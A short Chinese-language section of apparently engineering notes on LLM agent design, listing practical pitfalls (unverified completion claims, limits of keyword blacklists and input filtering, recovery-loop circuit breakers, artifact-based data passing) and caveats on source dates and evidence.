    经验与常见坑

    • 写完代码不跑检查就报告完成，或把测试通过等同于上线完成：完成标准必须匹配用户要求，包含已覆盖行为、修改边界和真实交付状态。
    • 安全检查靠关键字黑名单挡不住 Shell 组合爆炸；靠输入过滤挡不住提示注入——重点是让危险动作执行不出去。
    • 过时的文档比没有文档更糟；Agent 看不到的知识等于不存在——知识必须来自本轮可发现、获授权且版本明确的来源，不必全部复制进代码库。
    • 恢复机制自身也会失效：每条恢复路径必须有熔断上限，错误路径上禁用会再次调用模型的副作用逻辑（防死亡螺旋）。
    • 让 LLM 读大表数据再"抄写"给用户：耗 token、慢、极易出错——用 artifact 模式让数据绕过 LLM 直达前端。
    • 行号编辑方案在非 IDE 场景因行号漂移而不可靠。

    来源与时效边界

    正文修订日期按本次交付口径记录为 2026-11-13；极客时间外部资料也以 2026-11-13 归档为准。产品名称用于理解工程取舍，不是对当前安装、登录、权限或性能的保证。具体部署前需要核对相应版本的官方说明并实测。

    循环中的重复失败次数是阈值设计示例，需按自身失败率、动作风险和预算标定。模型间的效果对比只有在提供任务集、基线、预算和原始实验来源时才可复查；不以产品名称或未定位出处的数字代替证据。
